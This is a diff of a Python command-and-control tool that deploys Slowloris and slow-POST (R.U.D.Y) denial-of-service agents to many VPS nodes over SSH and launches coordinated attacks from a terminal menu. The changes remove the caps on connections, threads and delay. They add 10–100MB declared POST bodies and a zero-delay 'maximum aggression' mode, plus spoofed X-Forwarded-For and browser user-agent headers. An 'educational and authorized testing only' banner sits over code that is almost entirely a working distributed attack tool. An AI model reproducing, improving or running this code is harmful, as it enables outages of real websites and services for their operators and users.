@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Distributed Slow HTTP Testing C2 - Complete Terminal Interface (FIXED)
+Distributed Slow HTTP Testing C2 - Complete Terminal Interface (UNLIMITED EDITION)
 Author: Security Research Tool
 Purpose: Educational and Authorized Penetration Testing Only
 
@@ -248,9 +248,9 @@ class SSHManager:
             return False, str(e)
     
     def deploy_agent(self, ip):
-        """Deploy slow HTTP attack agent to VPS - COMPLETELY FIXED VERSION"""
+        """Deploy unlimited slow HTTP attack agent to VPS"""
         
-        # Fixed and optimized agent script with proper string escaping
+        # Complete unlimited agent script
         agent_script = '''#!/usr/bin/env python3
 import socket,threading,time,sys,random,string,signal,argparse
 from urllib.parse import urlparse
@@ -279,7 +279,7 @@ class SlowHTTPAttack:
         self.running=True
         start_time=time.time()
         
-        # Create initial connections with proper HTTP format
+        # UNLIMITED: Aggressive connection creation - no artificial limits
         print("[PHASE1] Creating initial connections...")
         for i in range(num_conns):
             if not self.running:
@@ -288,13 +288,17 @@ class SlowHTTPAttack:
             sock=self.create_socket()
             if sock:
                 try:
-                    # FIXED: Proper CRLF formatting
-                    request = f"GET /?id={random.randint(1000,99999)} HTTP/1.1\\r\\n"
+                    # Full HTTP request with multiple headers for maximum server load
+                    request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\\r\\n"
                     request += f"Host: {self.host}\\r\\n"
-                    request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\\r\\n"
-                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Cache-Control: no-cache\\r\\n"
+                    request += "Pragma: no-cache\\r\\n"
                     request += "Connection: keep-alive\\r\\n"
+                    request += "Upgrade-Insecure-Requests: 1\\r\\n"
                     
                     # Convert escape sequences to actual bytes
                     request_bytes = request.encode().decode('unicode_escape').encode()
@@ -305,7 +309,7 @@ class SlowHTTPAttack:
                     with self.lock:
                         self.stats['sent']+=1
                     
-                    if (i+1) % 25 == 0:
+                    if (i+1) % 100 == 0:
                         print(f"[PROGRESS] {i+1}/{num_conns} connections created")
                         
                 except Exception as e:
@@ -316,7 +320,9 @@ class SlowHTTPAttack:
                     except:
                         pass
             
-            time.sleep(0.02)  # Controlled delay
+            # MINIMAL DELAY - Maximum connection rate
+            if i % 100 == 0:
+                time.sleep(0.01)  # Very small delay only every 100 connections
         
         with self.lock:
             self.stats['active']=len(self.conns)
@@ -326,8 +332,8 @@ class SlowHTTPAttack:
             print("[ERROR] No connections established, aborting attack")
             return
         
-        # Keep connections alive phase
-        print("[PHASE2] Starting keep-alive phase...")
+        # Keep connections alive phase - AGGRESSIVE MODE
+        print("[PHASE2] Starting aggressive keep-alive phase...")
         cycle_count=0
         
         while self.running and self.conns:
@@ -339,27 +345,29 @@ class SlowHTTPAttack:
             cycle_count+=1
             active_before=len(self.conns)
             
-            # Send keep-alive headers to all connections
+            # Send multiple headers per connection for maximum server load
             failed_socks = []
+            headers_per_cycle = random.randint(2, 5)  # Multiple headers per cycle
+            
             for sock in self.conns:
                 try:
-                    # Generate random header
-                    header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(8,15)))
-                    header_value=''.join(random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10,20)))
-                    # FIXED: Proper CRLF formatting
-                    header = f"X-{header_name}: {header_value}\\r\\n"
-                    header_bytes = header.encode().decode('unicode_escape').encode()
-                    
-                    sock.send(header_bytes)
-                    with self.lock:
-                        self.stats['sent']+=1
+                    # Send multiple headers to increase server load
+                    for _ in range(headers_per_cycle):
+                        header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10,20)))
+                        header_value=''.join(random.choice(string.ascii_letters+string.digits+'-_.') for _ in range(random.randint(20,50)))
+                        header = f"X-{header_name}: {header_value}\\r\\n"
+                        header_bytes = header.encode().decode('unicode_escape').encode()
+                        
+                        sock.send(header_bytes)
+                        with self.lock:
+                            self.stats['sent']+=1
                     
                 except Exception:
                     failed_socks.append(sock)
                     with self.lock:
                         self.stats['errors']+=1
             
-            # Remove failed connections and create replacements
+            # Aggressive connection replacement - maintain connection count
             for sock in failed_socks:
                 if sock in self.conns:
                     self.conns.remove(sock)
@@ -368,25 +376,30 @@ class SlowHTTPAttack:
                 except:
                     pass
                 
-                # Try to create replacement connection
-                new_sock=self.create_socket()
-                if new_sock and len(self.conns) < num_conns:
-                    try:
-                        # FIXED: Proper initial request
-                        req = f"GET /?id={random.randint(1000,99999)} HTTP/1.1\\r\\n"
-                        req += f"Host: {self.host}\\r\\n"
-                        req += "Connection: keep-alive\\r\\n"
-                        req_bytes = req.encode().decode('unicode_escape').encode()
-                        
-                        new_sock.send(req_bytes)
-                        self.conns.append(new_sock)
-                        with self.lock:
-                            self.stats['sent']+=1
-                    except Exception:
+                # AGGRESSIVE: Always try to replace lost connections
+                replacement_attempts = 3  # Multiple attempts per failed connection
+                for attempt in range(replacement_attempts):
+                    new_sock=self.create_socket()
+                    if new_sock:
                         try:
-                            new_sock.close()
-                        except:
-                            pass
+                            # Full request with randomization
+                            req = f"GET /?session={random.randint(100000,999999)}&attempt={attempt} HTTP/1.1\\r\\n"
+                            req += f"Host: {self.host}\\r\\n"
+                            req += f"User-Agent: SlowHTTP-Agent-{random.randint(1000,9999)}\\r\\n"
+                            req += "Connection: keep-alive\\r\\n"
+                            req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n"
+                            req_bytes = req.encode().decode('unicode_escape').encode()
+                            
+                            new_sock.send(req_bytes)
+                            self.conns.append(new_sock)
+                            with self.lock:
+                                self.stats['sent']+=1
+                            break  # Success, stop attempting
+                        except Exception:
+                            try:
+                                new_sock.close()
+                            except:
+                                pass
             
             with self.lock:
                 self.stats['active']=len(self.conns)
@@ -394,10 +407,11 @@ class SlowHTTPAttack:
                 sent = self.stats['sent']
                 errors = self.stats['errors']
             
-            print(f"[CYCLE {cycle_count}] Active: {active_after} | Sent: {sent} | Errors: {errors} | Lost: {active_before-active_after}")
+            print(f"[CYCLE {cycle_count}] Active: {active_after} | Headers sent: {sent} | Errors: {errors} | Replaced: {active_before-active_after if active_before > active_after else 0}")
             
-            # Sleep between cycles
-            time.sleep(max(1, delay))
+            # VARIABLE DELAY for unpredictability
+            sleep_time = random.uniform(delay * 0.5, delay * 1.5)
+            time.sleep(sleep_time)
     
     def slow_post_attack(self,num_conns=50,delay=10,duration=0):
         print(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
@@ -413,15 +427,16 @@ class SlowHTTPAttack:
                 return
             
             try:
-                # FIXED: Send POST headers with large content-length
-                content_length=random.randint(100000,1000000)  # Smaller range to avoid memory issues
+                # UNLIMITED: Large content-length for maximum effectiveness
+                content_length=random.randint(10000000,100000000)  # 10MB to 100MB range
                 
-                # FIXED: Proper HTTP POST format
-                post_request = f"POST /slow{worker_id} HTTP/1.1\\r\\n"
+                # Proper HTTP POST format
+                post_request = f"POST /form{worker_id}?data=large HTTP/1.1\\r\\n"
                 post_request += f"Host: {self.host}\\r\\n"
                 post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                 post_request += f"Content-Length: {content_length}\\r\\n"
                 post_request += "Connection: keep-alive\\r\\n"
+                post_request += "Expect: 100-continue\\r\\n"  # Forces server to wait
                 post_request += "\\r\\n"  # End of headers
                 
                 # Convert escape sequences properly
@@ -431,21 +446,24 @@ class SlowHTTPAttack:
                 with self.lock:
                     self.stats['sent']+=1
                     
-                print(f"[WORKER {worker_id}] POST headers sent, content-length: {content_length}")
+                print(f"[WORKER {worker_id}] POST headers sent, content-length: {content_length:,} bytes")
                 
-                # FIXED: Send POST data very slowly with better control
+                # Send POST data extremely slowly - no artificial limits
                 bytes_sent=0
-                chunk_size=10  # Fixed small chunk size
+                chunk_sizes=[1,2,3,4,5,6,7,8,9,10,15,20]  # Variable chunk sizes
                 
                 while self.running and bytes_sent < content_length:
-                    # Check duration limit more efficiently
+                    # Check duration limit
                     if duration > 0 and (time.time() - start_time) >= duration:
                         print(f"[WORKER {worker_id}] Duration limit reached")
                         break
                     
-                    # Send small chunk of data
+                    # Variable chunk size for unpredictability
+                    chunk_size = random.choice(chunk_sizes)
                     remaining = min(chunk_size, content_length - bytes_sent)
-                    data=''.join(random.choice(string.ascii_letters+string.digits) for _ in range(remaining))
+                    
+                    # Generate data chunk
+                    data=''.join(random.choice(string.ascii_letters+string.digits+'=&') for _ in range(remaining))
                     
                     try:
                         sock.send(data.encode())
@@ -453,17 +471,19 @@ class SlowHTTPAttack:
                         with self.lock:
                             self.stats['sent'] += remaining
                     except Exception:
+                        print(f"[WORKER {worker_id}] Connection lost at {bytes_sent:,} bytes")
                         break
                     
-                    # Progress report every 50KB to reduce output spam
-                    if bytes_sent % 50000 == 0:
+                    # Progress report every 1MB
+                    if bytes_sent % 1000000 == 0:
                         progress = (bytes_sent/content_length)*100
-                        print(f"[WORKER {worker_id}] Progress: {bytes_sent}/{content_length} ({progress:.1f}%)")
+                        print(f"[WORKER {worker_id}] Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                     
-                    # FIXED: More reasonable delay
-                    time.sleep(max(0.1, delay * 0.1))  # Fraction of main delay
+                    # SLOW TRANSMISSION - The core of R.U.D.Y
+                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)  # Variable delay
+                    time.sleep(sleep_time)
                 
-                print(f"[WORKER {worker_id}] Completed: {bytes_sent} bytes sent")
+                print(f"[WORKER {worker_id}] Completed: {bytes_sent:,} bytes sent")
                 
             except Exception as e:
                 print(f"[WORKER {worker_id}] Error: {str(e)}")
@@ -475,31 +495,41 @@ class SlowHTTPAttack:
                 except:
                     pass
         
-        # FIXED: Better thread management
-        max_workers = min(num_conns, 50)  # Limit concurrent threads
+        # NO THREAD LIMITS - Use all requested connections
         threads=[]
-        print(f"[THREADS] Starting {max_workers} R.U.D.Y worker threads...")
+        print(f"[THREADS] Starting {num_conns} R.U.D.Y worker threads...")
         
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            # Submit all workers
-            futures = [executor.submit(post_worker, i+1) for i in range(num_conns)]
+        # Start all worker threads
+        for i in range(num_conns):
+            if not self.running:
+                break
+            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
+            thread.start()
+            threads.append(thread)
+            print(f"[THREAD {i+1}] Worker started")
+            time.sleep(0.1)  # Small stagger to avoid overwhelming
+        
+        # Monitor all threads
+        while self.running:
+            if duration > 0 and (time.time() - start_time) >= duration:
+                print("[DURATION] Time limit reached, stopping...")
+                self.running = False
+                break
             
-            # Monitor progress
-            while self.running and any(not f.done() for f in futures):
-                if duration > 0 and (time.time() - start_time) >= duration:
-                    print("[DURATION] Time limit reached, stopping...")
-                    self.running = False
-                    break
-                
-                completed = sum(1 for f in futures if f.done())
-                with self.lock:
-                    sent = self.stats['sent']
-                    errors = self.stats['errors']
-                
-                print(f"[R.U.D.Y STATUS] Workers: {num_conns-completed}/{num_conns} | Bytes sent: {sent:,} | Errors: {errors}")
-                time.sleep(15)  # Status update interval
-        
-        print("[R.U.D.Y] All workers completed")
+            # Count active threads
+            active_threads = sum(1 for t in threads if t.is_alive())
+            
+            with self.lock:
+                sent = self.stats['sent']
+                errors = self.stats['errors']
+            
+            print(f"[R.U.D.Y STATUS] Active workers: {active_threads}/{num_conns} | Total bytes sent: {sent:,} | Errors: {errors}")
+            
+            if active_threads == 0:
+                print("[R.U.D.Y] All workers completed")
+                break
+            
+            time.sleep(10)  # Status update interval
     
     def stop_attack(self):
         print("[STOP] Stopping attack...")
@@ -514,7 +544,7 @@ class SlowHTTPAttack:
         self.conns.clear()
         print("[STOP] Attack stopped")
 
-# FIXED: Better signal handling
+# Better signal handling
 attacker = None
 
 def signal_handler(sig,frame):
@@ -528,23 +558,30 @@ def signal_handler(sig,frame):
 def main():
     global attacker
     
-    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent - Fixed Version')
+    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent - UNLIMITED EDITION')
     parser.add_argument('target',help='Target URL or hostname')
     parser.add_argument('attack_type',choices=['slowloris','slow_post'],help='Type of attack to perform')
-    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100)')
-    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15)')
+    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100, no upper limit)')
+    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15, can be 0)')
     parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
     
     args=parser.parse_args()
     
-    # Validate arguments
-    if args.connections < 1 or args.connections > 10000:
-        print("ERROR: Connections must be between 1 and 10000")
+    # Validate arguments - REMOVED ARTIFICIAL LIMITS
+    if args.connections < 1:
+        print("ERROR: Connections must be at least 1")
         sys.exit(1)
     
-    if args.delay < 1:
-        print("ERROR: Delay must be at least 1 second")
+    if args.delay < 0:
+        print("ERROR: Delay cannot be negative")
         sys.exit(1)
+    
+    # Warning for very high connection counts
+    if args.connections > 10000:
+        print(f"WARNING: Very high connection count ({args.connections:,})")
+        print("This may overwhelm your system or network. Continue? (y/N)")
+        if input().strip().lower() != 'y':
+            sys.exit(1)
     
     # Parse target
     if args.target.startswith('http://') or args.target.startswith('https://'):
@@ -562,7 +599,7 @@ def main():
             target_port=80
     
     print("="*80)
-    print("SLOW HTTP ATTACK AGENT - FIXED VERSION")
+    print("SLOW HTTP ATTACK AGENT - UNLIMITED EDITION")
     print("="*80)
     print(f"Target: {target_host}:{target_port}")
     print(f"Attack: {args.attack_type.upper()}")
@@ -598,7 +635,7 @@ if __name__ == "__main__":
     main()
 '''
         
-        # FIXED: Use proper file transfer method
+        # Use proper file transfer method
         commands = [
             "mkdir -p /tmp/slowhttp_c2",
             "rm -f /tmp/slowhttp_c2/agent.py"  # Clean old version
@@ -610,7 +647,7 @@ if __name__ == "__main__":
             if not success:
                 return False, f"Setup failed: {output}"
         
-        # FIXED: Transfer file using SFTP instead of base64 encoding
+        # Transfer file using SFTP instead of base64 encoding
         try:
             if ip in self.connections:
                 sftp = self.connections[ip].open_sftp()
@@ -689,7 +726,7 @@ class AttackManager:
         for vps_ip in vps_list:
             print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
             
-            # FIXED: Better command building with validation
+            # Better command building with validation
             cmd = self._build_attack_command_fixed(target_url, attack_type, parameters)
             success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=15)
             
@@ -720,14 +757,14 @@ class AttackManager:
         delay = parameters.get('delay', 15) 
         duration = parameters.get('duration', 0)
         
-        # FIXED: Proper target parsing and validation
+        # Proper target parsing and validation
         target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
         
-        # Validate parameters
-        connections = max(1, min(connections, 5000))  # Limit connections
-        delay = max(1, delay)
+        # Basic validation only - NO ARTIFICIAL LIMITS
+        connections = max(1, connections)  # Only ensure it's positive
+        delay = max(0, delay)  # Allow zero delay for maximum aggression
         
-        # FIXED: Better command construction with error handling
+        # Unrestricted command construction
         cmd = f"cd /tmp/slowhttp_c2 && "
         cmd += f"nohup python3 agent.py '{target_clean}' {attack_type} "
         cmd += f"--connections {connections} --delay {delay} "
@@ -752,7 +789,7 @@ class AttackManager:
         for vps_ip in vps_list:
             print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
             
-            # FIXED: More thorough process killing
+            # More thorough process killing
             commands = [
                 # Kill by process name
                 "pkill -f 'python3.*agent.py' || true",
@@ -793,7 +830,7 @@ class AttackManager:
         status = {}
         
         for vps_ip in vps_list:
-            # FIXED: Better process detection
+            # Better process detection
             commands = [
                 "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l",
                 "pgrep -f 'python3.*agent.py' 2>/dev/null | wc -l"
@@ -823,9 +860,6 @@ class AttackManager:
             }
         
         return status
-
-# Rest of the classes remain the same as they were working properly...
-# [SlowHTTPTUI class and all its methods remain unchanged]
 
 class SlowHTTPTUI:
     def __init__(self):
@@ -861,7 +895,7 @@ class SlowHTTPTUI:
         banner = f"""{Colors.CYAN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
-║                           Terminal Interface v1.2                           ║
+║                          UNLIMITED EDITION v2.0                             ║
 ╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
 
 {Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
@@ -874,7 +908,7 @@ class SlowHTTPTUI:
         menu = f"""
 {Colors.BOLD}MAIN MENU:{Colors.RESET}
 {Colors.GREEN}[1]{Colors.RESET} VPS Management
-{Colors.GREEN}[2]{Colors.RESET} Launch Distributed Attack
+{Colors.GREEN}[2]{Colors.RESET} Launch Distributed Attack (UNLIMITED)
 {Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
 {Colors.GREEN}[4]{Colors.RESET} Attack History
 {Colors.GREEN}[5]{Colors.RESET} System Status
@@ -918,7 +952,7 @@ class SlowHTTPTUI:
 {Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
 {Colors.GREEN}[1]{Colors.RESET} Add VPS Node
 {Colors.GREEN}[2]{Colors.RESET} Test All Connections
-{Colors.GREEN}[3]{Colors.RESET} Deploy Agents to All
+{Colors.GREEN}[3]{Colors.RESET} Deploy Unlimited Agents to All
 {Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
 {Colors.GREEN}[5]{Colors.RESET} Test Single VPS
 {Colors.GREEN}[0]{Colors.RESET} Back to Main Menu
@@ -1087,7 +1121,7 @@ class SlowHTTPTUI:
             input("Press Enter to continue...")
             return
         
-        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL ONLINE VPS{Colors.RESET}")
+        print(f"\n{Colors.BOLD}DEPLOYING UNLIMITED AGENTS TO ALL ONLINE VPS{Colors.RESET}")
         print("-" * 50)
         
         successful_deployments = 0
@@ -1103,7 +1137,7 @@ class SlowHTTPTUI:
             else:
                 print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
         
-        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed successfully{Colors.RESET}")
+        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} unlimited agents deployed successfully{Colors.RESET}")
         input("\nPress Enter to continue...")
     
     def remove_vps(self):
@@ -1165,8 +1199,8 @@ class SlowHTTPTUI:
             input("Press Enter to continue...")
             return
         
-        print(f"{Colors.BOLD}LAUNCH DISTRIBUTED ATTACK{Colors.RESET}")
-        print("=" * 40)
+        print(f"{Colors.BOLD}LAUNCH UNLIMITED DISTRIBUTED ATTACK{Colors.RESET}")
+        print("=" * 50)
         
         print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
         for i, vps in enumerate(online_vps, 1):
@@ -1185,8 +1219,8 @@ class SlowHTTPTUI:
             
             # Attack type selection
             print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
-            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (Slow Headers)")
-            print(f"{Colors.GREEN}[2]{Colors.RESET} R.U.D.Y (Slow POST)")
+            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (UNLIMITED Headers)")
+            print(f"{Colors.GREEN}[2]{Colors.RESET} R.U.D.Y (UNLIMITED POST - 10MB-100MB per connection)")
             
             attack_choice = self.input_with_prompt("Select attack type (1-2): ")
             attack_types = {'1': 'slowloris', '2': 'slow_post'}
@@ -1222,23 +1256,25 @@ class SlowHTTPTUI:
                 input("Press Enter to continue...")
                 return
             
-            # Attack parameters
-            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
+            # Attack parameters - UNLIMITED MODE
+            print(f"\n{Colors.BOLD}UNLIMITED ATTACK PARAMETERS:{Colors.RESET}")
             
-            connections_str = self.input_with_prompt("Connections per VPS (default 100): ", False) or "100"
+            connections_str = self.input_with_prompt("Connections per VPS (default 100, NO UPPER LIMIT): ", False) or "100"
             try:
                 connections = int(connections_str)
-                if connections > 2000:
-                    print(f"{Colors.YELLOW}[WARNING] High connection count may overload VPS{Colors.RESET}")
-                    confirm = input(f"{Colors.YELLOW}Continue with {connections} connections per VPS? (y/N): {Colors.RESET}")
-                    if confirm.lower() != 'y':
-                        connections = 100
+                if connections > 20000:
+                    print(f"{Colors.RED}WARNING: EXTREMELY HIGH connection count ({connections:,}){Colors.RESET}")
+                    print("This will create massive server load. Continue? (y/N)")
+                    if input().strip().lower() != 'y':
+                        connections = 1000
             except ValueError:
                 connections = 100
             
-            delay_str = self.input_with_prompt("Delay between packets in seconds (default 15): ", False) or "15"
+            delay_str = self.input_with_prompt("Delay between packets (0=MAXIMUM AGGRESSION, default 15): ", False) or "15"
             try:
                 delay = int(delay_str)
+                if delay == 0:
+                    print(f"{Colors.RED}ZERO DELAY MODE: Maximum aggression enabled{Colors.RESET}")
             except ValueError:
                 delay = 15
             
@@ -1249,18 +1285,23 @@ class SlowHTTPTUI:
                 duration = 0
             
             # Attack summary
-            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
+            print(f"\n{Colors.BOLD}UNLIMITED ATTACK SUMMARY:{Colors.RESET}")
             print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
-            attack_name = "Slowloris" if attack_type == "slowloris" else "R.U.D.Y (Slow POST)"
+            attack_name = "Slowloris (UNLIMITED)" if attack_type == "slowloris" else "R.U.D.Y (UNLIMITED 10-100MB)"
             print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
             print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
             print(f"Connections per VPS: {Colors.YELLOW}{connections:,}{Colors.RESET}")
             print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * connections:,}{Colors.RESET}")
-            print(f"Packet Delay: {Colors.YELLOW}{delay}s{Colors.RESET}")
+            print(f"Packet Delay: {Colors.YELLOW}{delay}s {'(ZERO DELAY - MAX AGGRESSION)' if delay == 0 else ''}{Colors.RESET}")
             print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
             
+            if attack_type == 'slow_post':
+                estimated_data = len(selected_vps) * connections * 50  # Avg 50MB per connection
+                print(f"Estimated Total Data: {Colors.RED}{estimated_data:,} MB{Colors.RESET}")
+            
             # Final confirmation
-            confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.RESET}").strip().lower()
+            print(f"\n{Colors.RED}LAUNCH UNLIMITED ATTACK? (y/N): {Colors.RESET}", end="")
+            confirm = input().strip().lower()
             
             if confirm != 'y':
                 print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
@@ -1268,7 +1309,7 @@ class SlowHTTPTUI:
                 return
             
             # Create attack session
-            session_name = f"Attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+            session_name = f"Unlimited_{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
             target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0]
             
             parameters = {
@@ -1281,17 +1322,17 @@ class SlowHTTPTUI:
                 session_name, target_url, target_host, attack_type, selected_vps, parameters
             )
             
-            # Launch attack
+            # Launch unlimited attack
             success = self.attack_manager.launch_attack(
                 session_id, target_url, attack_type, selected_vps, parameters
             )
             
             if success:
-                print(f"\n{Colors.GREEN}[SUCCESS] Attack launched successfully!{Colors.RESET}")
+                print(f"\n{Colors.GREEN}[SUCCESS] UNLIMITED ATTACK LAUNCHED SUCCESSFULLY!{Colors.RESET}")
                 print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
                 
                 # Auto-start monitoring
-                input(f"\n{Colors.YELLOW}Press Enter to start monitoring...{Colors.RESET}")
+                input(f"\n{Colors.YELLOW}Press Enter to start real-time monitoring...{Colors.RESET}")
                 self.monitor_attack(session_id)
             else:
                 print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
@@ -1314,7 +1355,7 @@ class SlowHTTPTUI:
             
             print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
             for sid, attack_info in self.attack_manager.active_attacks.items():
-                attack_name = "Slowloris" if attack_info['attack_type'] == "slowloris" else "R.U.D.Y"
+                attack_name = "Slowloris (UNLIMITED)" if attack_info['attack_type'] == "slowloris" else "R.U.D.Y (UNLIMITED)"
                 print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
             
             try:
@@ -1330,7 +1371,7 @@ class SlowHTTPTUI:
             input("Press Enter to continue...")
             return
         
-        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time monitoring...{Colors.RESET}")
+        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time unlimited attack monitoring...{Colors.RESET}")
         print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
         time.sleep(2)
         
@@ -1342,11 +1383,11 @@ class SlowHTTPTUI:
                 # Clear screen and display status
                 self.clear_screen()
                 
-                print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
-                print(f"{Colors.BOLD}{Colors.CYAN}     DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
-                print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
+                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
+                print(f"{Colors.BOLD}{Colors.RED}     UNLIMITED DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
+                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
                 
-                attack_name = "SLOWLORIS" if attack_info.get('attack_type') == 'slowloris' else "R.U.D.Y"
+                attack_name = "SLOWLORIS (UNLIMITED)" if attack_info.get('attack_type') == 'slowloris' else "R.U.D.Y (UNLIMITED)"
                 print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
                 print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
                 
@@ -1354,9 +1395,13 @@ class SlowHTTPTUI:
                     uptime = datetime.now() - attack_info['start_time']
                     print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
                 
+                # Parameters display
+                params = attack_info.get('parameters', {})
+                print(f"{Colors.PURPLE}[PARAMS]  Connections: {params.get('connections', 'N/A'):,} | Delay: {params.get('delay', 'N/A')}s{Colors.RESET}")
+                
                 print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
                 print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<12} {'Last Check'}")
-                print("-" * 75)
+                print("-" * 80)
                 
                 total_processes = 0
                 active_vps = 0
@@ -1373,12 +1418,16 @@ class SlowHTTPTUI:
                     
                     print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<12} {datetime.now().strftime('%H:%M:%S')}")
                 
-                print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.RESET}")
+                print(f"\n{Colors.BOLD}UNLIMITED ATTACK STATISTICS:{Colors.RESET}")
                 print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
                 print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
                 
-                est_connections = total_processes * attack_info.get('parameters', {}).get('connections', 100)
-                print(f"{Colors.YELLOW}Estimated Connections: {est_connections:,}{Colors.RESET}")
+                est_connections = total_processes * params.get('connections', 100)
+                print(f"{Colors.RED}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
+                
+                if attack_info.get('attack_type') == 'slow_post':
+                    est_data_gb = (est_connections * 50) / 1024  # Estimated GB
+                    print(f"{Colors.RED}Estimated Data Transfer: {est_data_gb:.1f} GB{Colors.RESET}")
                 
                 print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
                 
@@ -1389,7 +1438,7 @@ class SlowHTTPTUI:
             
             # Ask if user wants to stop the attack
             try:
-                stop_attack = input(f"{Colors.RED}Stop the attack? (y/N): {Colors.RESET}").strip().lower()
+                stop_attack = input(f"{Colors.RED}Stop the unlimited attack? (y/N): {Colors.RESET}").strip().lower()
                 if stop_attack == 'y':
                     self.attack_manager.stop_attack(session_id)
             except KeyboardInterrupt:
@@ -1409,15 +1458,15 @@ class SlowHTTPTUI:
         if not sessions:
             print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
         else:
-            print(f"\n{'ID':<4} {'Session Name':<20} {'Target':<25} {'Type':<12} {'Status':<10} {'Start Time'}")
+            print(f"\n{'ID':<4} {'Session Name':<25} {'Target':<20} {'Type':<15} {'Status':<10} {'Start Time'}")
             print("-" * 100)
             
             for session in sessions:
                 start_time = session[6][:19] if session[6] else 'N/A'
